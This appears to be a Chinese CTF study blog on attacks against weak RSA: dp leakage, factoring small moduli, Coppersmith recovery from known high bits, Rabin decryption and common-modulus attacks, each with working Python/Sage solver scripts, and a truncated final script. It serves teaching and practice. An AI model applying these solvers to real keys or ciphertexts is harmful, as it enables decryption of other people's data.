12345678#!usr/env/python3#coding=utf-8import gmpy2mp = pow(c,dp,p)mq = pow(c,dq,q)Invq = gmpy2.invert(q,p)m = (mq+(mp-mq)*Invq*q) % n 已知dp,e,c,n理论证明我们可以知道 fn = (p-1)*(q-1) \\ e*d \equiv -1 \ mod \ fn \\ dp = d \ mod \ (p-1)\\之后我们可以知道： (e*d-1) \ mod \ (p-1)*(q-1) = 0将dp*e之后 e*dp-1 = e*d-1 \ mod \ (p-1) = 0所以e*dp-1是p-1的k倍，k在（1，e）之中(原因是dp在p-1之内) 下面就就写一下关于爆破e值的脚本,从而求出d 1234567891011#!usr/env/python3#coding:utf-8import gmpy2for i in range(e): if (e*dp-1)% i == 0: if n %(((dp*e-1)//i)+1) == 0: p = ((dp*e-1)//i)+1 q = n//p fn = (p-1)*(q-1) d = gmpy2.invert(e,fn) 题目rsa(2019/11/11湖湘杯初赛) 12 已知dp,dq dp = d mod (p-1) dq = d mod (q-1) ​ 已知p+q与pq 根据题目要求可以求出pq与p+q，这时候可以直接求出fn 题目rsa Do you know what e is it？ 打开文件，有两个文件，一个python文件，一个output 123456789101112131415161718#outputimport gmpy2from fractions import Fractionfrom secret import flag,efrom libnum import *from os import urandomk = 1024p = gmpy2.next_prime(int(urandom(k / 8).encode('hex'),16))q = gmpy2.next_prime(int(urandom(k / 8).encode('hex'),16))n = p*qassert(e&lt;1000)print n#自动约分化简print Fraction(int(p+1),int(p)) +Fraction(int(q+1),int(q))print pow(123,e,n)msg = s2n(flag)assert(msg&lt;n)print pow(msg,e,n) 123456#output953879566385127129760273802967108987871801224293521309656625013032504693672054024753414349802547754416134733037967911176587142073225574121043473642395196218922730265899749766452092937521571596006361579248096580712743894804429834830015310276049041057863825966565660878463508873580947091613662877940014598363293086188376270760662920826080344608357967449745151465030935192543039151562989821887504967787098901607108684481962677838837076440024237646934315829463824066019075497862735607611522841016295608726652727122543914234730410066080051727677240772829041407491224366512674103094877588373954495237818826471471608790979719077591327702542595205476059342179757436024485870426193132500260650093873441080495068286996050955088322694660759358223531742841464511482420869472847903924378454605317994995329041858750431431920127231584961931614254877896088596696600306205520980821157276519331313217569270177471618941832273257558800291967266057799408185825199394392306374394195697993019961311696247374832761757990150416392201444079060627610573918631913438062954960835929982836033906925917632413007648356037059843552967726871763559759125837289869091638924336309932526582201350695938677991368335828814565265478203873169858685929462350511138398905572292/95387956638512712976027380296710898787180122429352130965662501303250469367205402475341434980254775441613473303796791117658714207322557412104347364239519621892273026589974976645209293752157159600636157924809658071274389480442983483001531027604904105786382596656566087846350887358094709161366287794001459836329308618837627076066292082608034460835796744974515146503093519254303915156298982188750496778709890160710868448196267783883707644002423764693431582946382406601907549786273560761152284101629560872665272712254391423473041006608005172767724077282904140749122436651267410309487758837395449523781882647147160879097973682841016180765235491991308844223559280515259963279776325449044378785042628708253785168272257930101654344941572383796859954304099669511227292434116945695621640628150981106397501013784576414713161885022637250982316794019284941609422131754042592567709842185932454581085989309262603864437993016993363093319463411736522017912935710290258186745751983118458119576064744902303825119965378934485244268093919806379834733053188195234088542646232542261272238621501735752064447265701830968916301292447788027934762957469138461054541986277303495910407762399046490836902121070389476875516762048462433039234972742941586801378979220008051262826174054961747648114128456872349675769941760630519744351742977740846748646739901172672743584989842268056810152117350241337045055812845489372389014195433916347255846499434232234822333192328886207187844781726928951986353054876826105507064928478812402103648940709131760865763234071703554208057808885564381400571862422316195578258814602362582573148358552148686182480215663291366798585241933446701357953551496955627421526567152576426417189707335038601040167826900549139608192971559659991213411381604721734898065256138516 分析：利用123对应的那个密文，解出e值， fn = (p-1)*(q-1) = p*q-(p+q)+1 \\利用上面的式子，我们可以利用上述的式子 \frac{p+1}{p}+\frac{q+1}{q} = 2 + \frac{p+q}{p*q} \\求出p+q后，就可以顺手解出fn 123456789101112131415161718192021222324252627#!usr/env/python3#coding=utf-8#owner: IFpop#time: 2910/11/2from z3 import *import gmpy2from Crypto.Util import numbern = 9538795663851271297602738029671089878718012242935213096566250130325046936720540247534143498025477544161347330379679111765871420732255741210434736423951962189227302658997497664520929375215715960063615792480965807127438948044298348300153102760490410578638259665656608784635088735809470916136628779400145983632930861883762707606629208260803446083579674497451514650309351925430391515629898218875049677870989016071086844819626778388370764400242376469343158294638240660190754978627356076115228410162956087266527271225439142347304100660800517276772407728290414074912243665126741030948775883739544952378188264714716087909797sum_pq = 19077591327702542595205476059342179757436024485870426193132500260650093873441080495068286996050955088322694660759358223531742841464511482420869472847903924378454605317994995329041858750431431920127231584961931614254877896088596696600306205520980821157276519331313217569270177471618941832273257558800291967266057799408185825199394392306374394195697993019961311696247374832761757990150416392201444079060627610573918631913438062954960835929982836033906925917632413007648356037059843552967726871763559759125837289869091638924336309932526582201350695938677991368335828814565265478203873169858685929462350511138398905572292#196075640660409986135975784767502028538644025058282395628670981900974958890619954451344723318649578431744942274184506178219307129498083095220609328355931687266846079805131400737270051437647584592782747418213354229728108610925547647805880482097163218511341484311783416306321402379596024705973981708966729752698sum_pq = sum_pq-2*n# c_123 = 368284101618076523549199130884422355928051525996327977632544904437878504262870825378516827225793010165434494157238379685995430409966951122729243411694569562164062815098110639750101378457641471316188502263725098231679401928494160942213175404259256770984218593245458108598930926260386443799301699336309331946341173652201791293571029025818674575198311845811957606474490230382511996537893448524426809391980637983473305318819523408854264623254226127223862150173575206444726570183096891630129244778802793476295746913846105454198627# for e in range(1000):# temp_c = pow(123,e,n)# if temp_c == c:# print(e)# break# d = (p-1)*(q-1)e = 251c = 7303495910407762399046490836902121070389476875516762048462433039234972742941586801378979220008051262826174054961747648114128456872349675769941760630519744351742977740846748646739901172672743584989842268056810152117350241337045055812845489372389014195433916347255846499434232234822333192328886207187844781726928951986353054876826105507064928478812402103648940709131760865763234071703554208057808885564381400571862422316195578258814602362582573148358552148686182480215663291366798585241933446701357953551496955627421526567152576426417189707335038601040167826900549139608192971559659991213411381604721734898065256138516fn = n-sum_pq+1d = gmpy2.invert(e,fn)m = pow(c,d,n)print(number.long_to_bytes(m)) 分解模数N方法介绍 n比较小的话，可以手写脚本进行爆破 1234567#coding=utf-8for i in range(2,n): if(n%i == 0): p = i q = n/i break n比较大的话，可以使用一些攻击进行暴力破解，如RSATool或者yafu yafu提取码：9qtg RSATool提取码：502a 一个在线分解大素数的网站：http://factordb.com,这个网站只能分解已经存在分解过的模数n值 题目xyf(Jarvisoj)123n=3161262255255421133292506694323988711204792818702640666084331634444148712428915950639954540974469931426618702044672318134908678730641981414037034058320359158246813987154679178159391832232990193738454116371045928434239936027006539348488316754611586659587677659791620481200732564068367148541242426533823626586574915275209508300120574819113851895932912208783915652764568319771482309338434364094681579135086703127977870534715039005822312878739611630155714313119545610939253355808742646891815442758660278514976431521933763272615653261044607041876212998883732724662410197038419721773290601109065965674129599626151139566369e=65537c=631583911592660652215412683088688785438938386403323323131247534561958531288570612134139288090533619548876156447498627938626419617968918299212863936839701943643735437264304062828205809984533592547599060829451668240569384130130080928292082888526567902695707215660020201392640388518379063244487204881439591813398495285025704285781072987024698133147354238702861803146548057736756003294248791827782280722670457157385205787259979804892966529536902959813675537028879407802365439024711942091123058305460856676910458268097798532901040050506906141547909766093323197363034959926900440420805768716029052885452560625308314284406 使用yafu对模数进行分解： 12p= 56225103425920179745019828423382255030086226600783237398582720244250840205090747144995470046432814267877822949968612053620215667790366338413979256357713975498764498045710766375614107934719809398451422359883451257033337168560937824719275885709824193760523306327217910106187213556299122895037021898556005848927 q = 56225103425920179745019828423382255030086226600783237398582720244250840205090747144995470046432814267877822949968612053620215667790366338413979256357713975498764498045710766375614107934719809398451422359883451257033337168560937824719275885709824193760523306327217910106187213556299122895037021898556005848447 脚本： 1234567891011121314151617#coding=utf-8#owner:IFpop#time:2019/10/28import gmpy2from Crypto.Util import numberc = 631583911592660652215412683088688785438938386403323323131247534561958531288570612134139288090533619548876156447498627938626419617968918299212863936839701943643735437264304062828205809984533592547599060829451668240569384130130080928292082888526567902695707215660020201392640388518379063244487204881439591813398495285025704285781072987024698133147354238702861803146548057736756003294248791827782280722670457157385205787259979804892966529536902959813675537028879407802365439024711942091123058305460856676910458268097798532901040050506906141547909766093323197363034959926900440420805768716029052885452560625308314284406n = 3161262255255421133292506694323988711204792818702640666084331634444148712428915950639954540974469931426618702044672318134908678730641981414037034058320359158246813987154679178159391832232990193738454116371045928434239936027006539348488316754611586659587677659791620481200732564068367148541242426533823626586574915275209508300120574819113851895932912208783915652764568319771482309338434364094681579135086703127977870534715039005822312878739611630155714313119545610939253355808742646891815442758660278514976431521933763272615653261044607041876212998883732724662410197038419721773290601109065965674129599626151139566369e = 65537p = 56225103425920179745019828423382255030086226600783237398582720244250840205090747144995470046432814267877822949968612053620215667790366338413979256357713975498764498045710766375614107934719809398451422359883451257033337168560937824719275885709824193760523306327217910106187213556299122895037021898556005848927q = 56225103425920179745019828423382255030086226600783237398582720244250840205090747144995470046432814267877822949968612053620215667790366338413979256357713975498764498045710766375614107934719809398451422359883451257033337168560937824719275885709824193760523306327217910106187213556299122895037021898556005848447fn = (p-1)*(q-1)d = gmpy2.invert(e,fn)m = pow(c,d,n)print(number.long_to_bytes(m).decode())#flag&#123;yafu_is_great_2&#125; Factoring with High Bits Known 当我们知道一个公钥中模数N的一个因子的较高位时，我们就有一定几率来分解N。 需要安装sage 下载好之后，进行如下操作： 1234$ tar xvf sage-8.9-Ubuntu_18.04-x86_64.tar.bz2$ cd SageMath$ ./sage #运行进入交互页面$ ./sage *.sage #直接运行程序 模板： 1234567891011121314151617181920212223242526from sage.all import *import binasciin = 0x.... # 此处为16进制数p4 =0x.... #p的高位 16进制cipher = 0x 密文e2 = 0xf93bpbits = 1024kbits = pbits - p4.nbits()print p4.nbits()p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)if roots: p = p4+int(roots[0]) print "p: ", hex(int(p)) assert n % p == 0 q = n/int(p) print "q: ", hex(int(q)) print gcd(p,q) phin = (p-1)*(q-1) print gcd(e2,phin) d = inverse_mod(e2,phin) flag = pow(cipher,d,n) flag = hex(int(flag))[2:-1] print binascii.unhexlify(flag) 题目cry给了个cry.py文件和访问链接: nc pwn2.jarvisoj.com 9891 看完代码: 先随机生成了一个模数n以及e，需要使用n与e对任一一个信息进行加密，然后转成hex形式，传入程序才能走向下一步 之后给出了使用base64加密的密文，以及使用RSA加密的aes_key和初始向量IV AES是一种对称加密，也就是加密密钥和解密密钥是相同的 12345nc pwn2.jarvisoj.com 9891 ====welcome to cry system==== give you the public key: n:0x1cf288a5f1759c54d5a2c38e252c14662e5ef2d70294b01e2f08564fc6e6dfad5184972687de2b46102e2e4854191f6d960451e121c8313e9b870d401d49bd90dd9ca8ba6bbfe75c95bbe54b413d5952aec0a97dff2c3f8442cd4c44211d59ec140c3f18712e73f81b5c78a598a42217fb2bba465920b39a9069ab9f0d47d361677c87a82659ac2205aca88c1cb34ffd8d0633f4965f7c9d19fa39fdf5c8b1e4e53aa91e4d82086d090d7fc10393c132e60ec6bbedcb172f41cf84411acaf66003e1d2ee9e69d44f946c805a4c1c69a2d345e2eb379f88f98445ac625ba04ff845fa841de886ccd11219680ffcfd291f43bf07b9455570b4502278a0b0b501db e:0x10001 give me the crypted message in hex:0x115370ba6049a21212d6cd98049f88f881361065a8453796852334c46080867772e450f8a7383c01e79a13a10236f68df473ccf910479df0e0fe507972d04987cc0c755430f2ccaf61a7a13e1cc2e7bbc7aba02efbf5e0c15c931ac11ffc688f24332d3252b077723c4fac1007134f56610ae894552e3fe0207ca3a19d4d2a21a3737882d08d1ac4c4a0524652545bdcc3b102191bfd766e57bd9b4d42987da43ff70466e5cf0fb314f546f4f5774160f6b7eee9650f4d92f4078f6ffe4a16e22f49df6efea9c8dd548233cba2e3ba9251b57b5ef0b6f305bc1721c2fd3361057d95472c4ca2d76a2b284eb78d2884b3584d26b9ee743c35a484c29ff5556fae 通过得到的n,e任一加密一段字符串 123456789101112131415161718#!/usr/bin/python#coding=utf-8#owner: IFpop#time: 2019/10/29from Crypto.Util import numberm = 'welcome'm = m.encode('utf-8')n = 0x190bc1baa378011895e3ca794b1d9918ebd1ffa749f4b0d6495cfafd6c3fd0303b1e9f822478c282c8377c06dabc211f8140bc9696fadb8e7b7bcf145653e4555a2c79b561e613917e5d1f91e439526c4d75b72b34a0827640434cd37004de4b9694407e247d7591b9a7b9067ef53cc4c1087920f057272aaf3c7e23e2ff873e05c383edd23ba87af1acb8d3185636cc265997f8a416e4984b8ede2fa4fa528ba854a1abf8333965289d5b0ff5f44b208905f1a239c83816d67dd689c37b04f954a43984811fe9d9e0e282362a0f3b777f53e26ebf0950bbfcf23d59fc54f52a7473aae116d72ca0fa9a23e779ae47a08af00874f4b5a11fd1dedad8076ea247e = 0x10001c = pow(number.bytes_to_long(m),e,n)print(hex(c))#0x18f574e08d83e95dec3f1e01ea955d7e9e3eb912fddf3da45ef6173c15872d050f740f4cdd2113c5a20dab2b29bb7f170202340af2bafdd08489c31293a3b556a0d150cbfaff898223c7878f23742898b0a683a0ea9cfdba993fdaa7624caf58c5720cbf08fdeff917d27a3930161fd9f598065a72a88c0b89ed9113f28bb1035f505afff643f93750ed0405dc54edebdc96ab2dfbc0d7360dde1a6b78acd8e9dd781399bfa5209a93ed44571b8a39b02989771baa105253e0c66bedbaa22d8b90318841a85ae82ddab63d93a01c97548681ab96a25f58d0386bedfc2f101a7b42589d661342393513914b8ca1e8d34637f98802d06434fe06d459077fdc8786#0x5ac23d297db75d07ae452d66ea20870f5ef7a61eb66ec8bfa5e2faa37e4bf45a2fbbf1d0ed0a3be8e9475928491b69c5a143d7da364915a8750db4fb0a69b9d5bdf422c00a6e8da8b352289a9582ab3394e9688166639ed055ca6f8dd68896a7976e285fee56d9d06b44ae82aea182ed12c69a3c8ee9475c52ff8b9458abf93c46a93b34950f61447b3430a6a10313a6f6d3926d33f8f32353ac354a89ab8d03f0aede0f257515208626e61af16a3af2be75ac0dd2d48b3ebada4b7dbab87b89b62d17fc1bff115b0feadf747d9158aab2668e2ef6e37799d00821b42be3a796d218a0b30f157a5ebb83716984e07ae3e7a4ce30553d8d54ae61f5b39078095#b2fc1f1fa4dda1ecedbcf081013e57d44235ea2b0fd96cf85b09d7e4afba8f920f6b0370fdae1898ab8c887c42fc969265d8dfa1d19a83c900aa77db06791c170dbab565440d9caa0693ccb75954dd30605d5b5642b80812121e 通过交互页面得到密文c以及aes_key和iv，这里只给出p的高位，所以需要我们进行爆破，求出最终的p来，下面是ans.sage文件: 123456789101112131415161718192021222324252627282930313233343536373839404142#coding=utf-8#owner: IFpop#time: 2019/10/29import binasciin = 0x190bc1baa378011895e3ca794b1d9918ebd1ffa749f4b0d6495cfafd6c3fd0303b1e9f822478c282c8377c06dabc211f8140bc9696fadb8e7b7bcf145653e4555a2c79b561e613917e5d1f91e439526c4d75b72b34a0827640434cd37004de4b9694407e247d7591b9a7b9067ef53cc4c1087920f057272aaf3c7e23e2ff873e05c383edd23ba87af1acb8d3185636cc265997f8a416e4984b8ede2fa4fa528ba854a1abf8333965289d5b0ff5f44b208905f1a239c83816d67dd689c37b04f954a43984811fe9d9e0e282362a0f3b777f53e26ebf0950bbfcf23d59fc54f52a7473aae116d72ca0fa9a23e779ae47a08af00874f4b5a11fd1dedad8076ea247e = 0x10001p4 =0xb2fc1f1fa4dda1ecedbcf081013e57d44235ea2b0fd96cf85b09d7e4afba8f920f6b0370fdae1898ab8c887c42fc969265d8dfa1d19a83c900aa77db06791c170dbab565440d9caa0693ccb75954dd30605d5b5642b80812121ec_aes_key = 0x18f574e08d83e95dec3f1e01ea955d7e9e3eb912fddf3da45ef6173c15872d050f740f4cdd2113c5a20dab2b29bb7f170202340af2bafdd08489c31293a3b556a0d150cbfaff898223c7878f23742898b0a683a0ea9cfdba993fdaa7624caf58c5720cbf08fdeff917d27a3930161fd9f598065a72a88c0b89ed9113f28bb1035f505afff643f93750ed0405dc54edebdc96ab2dfbc0d7360dde1a6b78acd8e9dd781399bfa5209a93ed44571b8a39b02989771baa105253e0c66bedbaa22d8b90318841a85ae82ddab63d93a01c97548681ab96a25f58d0386bedfc2f101a7b42589d661342393513914b8ca1e8d34637f98802d06434fe06d459077fdc8786c_iv = 0x5ac23d297db75d07ae452d66ea20870f5ef7a61eb66ec8bfa5e2faa37e4bf45a2fbbf1d0ed0a3be8e9475928491b69c5a143d7da364915a8750db4fb0a69b9d5bdf422c00a6e8da8b352289a9582ab3394e9688166639ed055ca6f8dd68896a7976e285fee56d9d06b44ae82aea182ed12c69a3c8ee9475c52ff8b9458abf93c46a93b34950f61447b3430a6a10313a6f6d3926d33f8f32353ac354a89ab8d03f0aede0f257515208626e61af16a3af2be75ac0dd2d48b3ebada4b7dbab87b89b62d17fc1bff115b0feadf747d9158aab2668e2ef6e37799d00821b42be3a796d218a0b30f157a5ebb83716984e07ae3e7a4ce30553d8d54ae61f5b39078095pbits = 1024kbits = pbits - p4.nbits()print(p4.nbits())p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)if roots: p = p4+int(roots[0]) print "p: ", hex(int(p)) assert n % p == 0 q = n/int(p) print "q: ", hex(int(q)) print gcd(p,q) phin = (p-1)*(q-1) print(gcd(e,phin)) d = inverse_mod(e,phin) m_aes_key = pow(c_aes_key,d,n) m_aes_key = hex(int(m_aes_key)) m_iv = pow(c_iv,d,n) m_iv = hex(int(m_iv)) print("ck:") print(m_aes_key) print("iv:") print(m_iv)#ck: e014637373b84ef7a9ccefb5b24e097#iv: 1b892532aabc36ee8975a5793a88fd2f#这里有一个坑点，就是位数应该和大的那一位是相等的，所以短的那一个应该在前面补0 剩下就可以直接开始解密了： 12345678910111213141516#coding=utf-8#owner: IFpop#time: 2019/10/29import binasciifrom Crypto.Cipher import AESimport base64flag = 'LEOgtbX8wRuuejn8sBke7yooByv+nDwYTaiINR4GGfY='key = '0e014637373b84ef7a9ccefb5b24e097'iv = '1b892532aabc36ee8975a5793a88fd2f'cipher = AES.new(key.decode('hex'), AES.MODE_CBC, iv.decode('hex'))flag = base64.b64decode(flag)flag = cipher.decrypt(flag)print(flag)#aaaaaflag&#123;ok_this_is_a_flag_rsa&#125; Rabin算法 基本知识 hardRSA——Jarvis OJ加压后发现两个文件，一个公钥，一个enc文件 使用openssl查看 1234openssl rsa -in pubkey.pem -pubin -text -modulus#下面是显示RSA Public-Key: (256 bit) Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 2 (0x2) Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgEC -----END PUBLIC KEY----- 典型的rabin加密，使用模块叫脚本即可： 12345678910111213141516171819202122232425262728#coding=utf-8import stringfrom Crypto.Util.number import long_to_bytesimport gmpydef rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) / 4, p) #整除 ⽤// mq = pow(c, (q + 1) / 4, q) yp = gmpy.invert(p, q) yq = gmpy.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss)with open('flag.enc', 'r') as f: c = f.read().encode('hex') c = string.atoi(c, base=16)p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239n = p*q temp = rabin_decrypt(c,p,q,2)for i in temp: print(long_to_bytes(i))#PCTF&#123;sp3ci4l_rsa&#125; 一句话加密下载附件得到两个文件，一个图片，一个encode.py 1234#encode.pyc = pow(int(m.encode('hex'), 16),e,n)c1:62501276588435548378091741866858001847904773180843384150570636252430662080263c2:72510845991687063707663748783701000040760576923237697638580153046559809128516 使用winhex打开查看它，发现末尾有一段 0xc2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dd?kobe&quot; 本来以为图片是e.png，所以这是e的值，但发现可以使用yafu将其分解成两个大素数，所以认为这个是模数n 这里还有一个提示信息，就是kobe，图片上的符号表示的是kobecode，还是见识太少 翻译出来是TWO，所以猜测是rabin加密，解密如下： 123456789101112131415161718192021222324252627282930313233#coding=utf-8#owner: IFpop#time: 2019/10/15from Crypto.Util import numberimport gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) #整除 ⽤// mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss)c1=62501276588435548378091741866858001847904773180843384150570636252430662080263c2=72510845991687063707663748783701000040760576923237697638580153046559809128516p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239n = p*q temp1 = rabin_decrypt(c1,p,q,2)temp2 = rabin_decrypt(c2,p,q,2)for i in temp1: print(number.long_to_bytes(i))for i in temp2: print(number.long_to_bytes(i))#unctf&#123;412a1ed6d21e55191ee5131f266f5178&#125; 共模攻击（Common Modulus Attack) 使用相同的模数n,但是使用了不同的公钥e加密同一明文信息，且公钥中e1,e2应该互质。 方法 结论：当n不变的情况下，知道n,e1,e2,c1,c2 可以在不知道d1,d2情况下，解出m。 证明 由RSA基本原理可知： \begin{array}{*{20} {l} } { \left\{ \begin {array} {*{20} {c} } { c_1 = m^{e_1}\ mod\ n }\\ { c_2 = m^{e_2}\ mod\ n}\\ \end{array}\right. }\\ \end{array}由于e1与e2互质，由贝祖等式可知，必有s1,s2满足： e_1*s_1+e_2*s_2 = 1s1,s2皆为整数，但是一正一负，我们可以通过扩展欧几里得算法计算s1,s2 所以： 题目积累very hard RSA(JarvisoJ)解压下来有三个文件，两个enc文件，和一个加密的python脚本 123456789101112131415161718192021222324252627#veryhrdrsa.py#!/usr/bin/env/pythonimport randomN = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929Ldef pad_even(x): return ('', '0')[len(x)%2] + xe1 = 17e2 = 65537fi = open('flag.txt','rb')fo1 = open('flag.enc1','wb')fo2 = open('flag.enc2','wb')data = fi.read()fi.close()while (len(data)&lt;512-11): data = chr(random.randint(0,255))+datadata_num = int(data.encode('hex'),16)encrypt1 = pow(data_num,e1,N)encrypt2 = pow(data_num,e2,N)fo1.write(pad_even(format(encrypt1,'x')).decode('hex'))fo2.write(pad_even(format(encrypt2,'x')).decode('hex'))fo1.close()fo2.close() 通过算法很容易知道是共模攻击，所以我们不需要的得到密钥d就可以进行解密： 这里出现了一个问题，就是使用gmpy无法进行解密，可能是我脚本写的有问题，目前没有找到解决方案。 12345678910111213141516171819202122import gmpy2from Crypto.Util import numberN = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929with open('flag.enc1', 'rb') as f: c1 = number.bytes_to_long(f.read()) with open('flag.enc2', 'rb') as f: c2 = number.bytes_to_long(f.read())e1 = 17e2 = 65537print(c1)_, s1, s2 = gmpy2.gcdext(e1, e2)if(s1 &lt; 0): s1 = -s1 c1 = gmpy2.invert(c1,N)if(s2 &lt; 0): s2 = -s2 c2 = gmpy2.invert(c2,N)res = (pow(c1, s1, N) * pow(c2,s2,N)) % Nprint(number.long_to_bytes(res))#PCTF&#123;M4st3r_oF_Number_Th3ory&#125; rsappend(jarvisoJ)解压下来有两个文件，一个python脚本程序，一个可读文本 1234567891011121314151617181920212223242526272829303132333435flag = open("flag", "r").read().strip()assert len(flag) == 32import primefacimport randomfrom os import urandomdef genprime(l): l/=8 big=1 while(l): big=big&lt;&lt;8 l-=1 big-=1 small=(big+1)&gt;&gt;4 temp=random.randint(small,big) return primefac.nextprime(temp)def str2num(s): return int(s.encode('hex'), 16)def padding(s): return s+urandom(abs(256-len(s)))def rsappend(m): p = genprime(2048) q = genprime(2048) n = p * q result=[str(n)+"\n"] pm=padding(flag) for i in range(32): #这里是关键 e=genprime(32) c=pow(str2num(pm),e,n) result.append(str(e)+"###"+str(c)+"\n") return "".join(result)open("result","w").write(rsappend(flag)) 直接看看关键位置，发现使用不同的e对密文进行了32次加密，但是模数n是相同的，所以这里是共模攻击 第一行数是模数n值，之后每个对应一个密文，只需要两个就可以直接解密 12345678910111213141516171819202122232425#coding=utf-8#owner:IFpop#time:2019/10/28import gmpy2from Crypto.Util import numberN = 130129008900473203968454456805638875182255844172836031362469765750555629223299054613072677100571707156698316733582683118539756860001556017029333867329591302318262912728008327902112481960175532302595162289611406978353816368008691640641366763939266242207191229240305820321249712345088877729541037319788659353057396178127928848886417880913823432701577855911982710310391664759040416918636673098245499680559140960154217578440590540485803953844560093151975252604098243460784073934982164384904788470380402066708313893480356219937915540825156266934523595689350157227336528136089157698775968997579723271988825396396444999743016035145444220925369592263295741687879468786947998534483539986779457827253891091252408156073413533385415338751818544323853074296042153599429749378847870780593975579477549218822682233583377677693108437331184962345568217859524495625257015837972947971787321584159575618388588687948368216479955807108888453821700067186732627409832722329355336479016104249514839541606562090752437124270651936485389358065775555250883907067083447197860848471728871909151915883316674512739238840179296263390441457949281128267215916340163366686542160467601357340644950755337706786366316621293666173843528346692669268972961669116101104865152273c1 = 95302089605615051645253770338205531172677353498946580682786822045513597212422921981567826452072575982096979591435896082106066368909398510427324124083956090397824543655853708684901332136907086372208856759943292176759073194584568350898675282883285945088425893961769183074018286761903249180704401358403273776903672507958464947244563165564687651203497198317095965140433811056890812018746508121991041040929574993486548175817290824525606551459788553765629416110310419007396912225733599205599864440826319234419035248234403040065378375700430311931418759746223148198205862641252459687694589780856855757703678024583642215076094232444641853081607984934672271461513190437757388818064739151861157236855430066735235471068167602037785718403200529481153399754491247323829122718485697100562237822159608309949585990842201041193231738706398444530233533281604482892716292766323711237917277799500317596333142843576977429802405873159965636003943698854699972663575602383960580472190300576561953143218321528070200681456278974433060654128626428761278953024384187213765974659768657721533448706022075747036347982370028705538843276631102928500802573434484354218539824751579164697748967608238067706842975984077663380114254296902060435479795741671231918448537178c2 = 105918022590727868761989308441554006325741233318901416621101439141134508212362387984949614887131575960019253866892976283979646611794365370050551871112439674346802340152058463892106629344277362169322187627579360245792142005899616101515519718660483000821415412306495286717542069436530262341500852884860324349096274655178057271529986597578695272732947460673640986877589225588415523871081101162696385279491410034057376225511693022693861779342120101749193614060384925056132593068290214170342896671210026723193650534803792328917982049779674425511275821311773130342656939142955431868128759911406827872932920704284125816103225607727270365652734742083302757644298457617564597237089509337896240249999242834787525341715546373108420197569425092674224333823552432226153066667988737348643469923827028254712179077001007265954488404167147591307425224250970874724864947175449960116685682348915647317191880538777148647712260093008241728509225817352093441924045801257015598517963598799676359095235231066752986688784477694024390356904157694178691411759003004184256950519184836209393583431328640341243629167223114681734264945594931213193459079614652400888215324779908031661350565230685273639666615465296133672907093946148188967451042301308884510424218096e1 = 3493354673e2 = 340864687_, s1, s2 = gmpy2.gcdext(e1, e2)if(s1 &lt; 0): s1 = -s1 c1 = gmpy2.invert(c1,N)if(s2 &lt; 0): s2 = -s2 c2 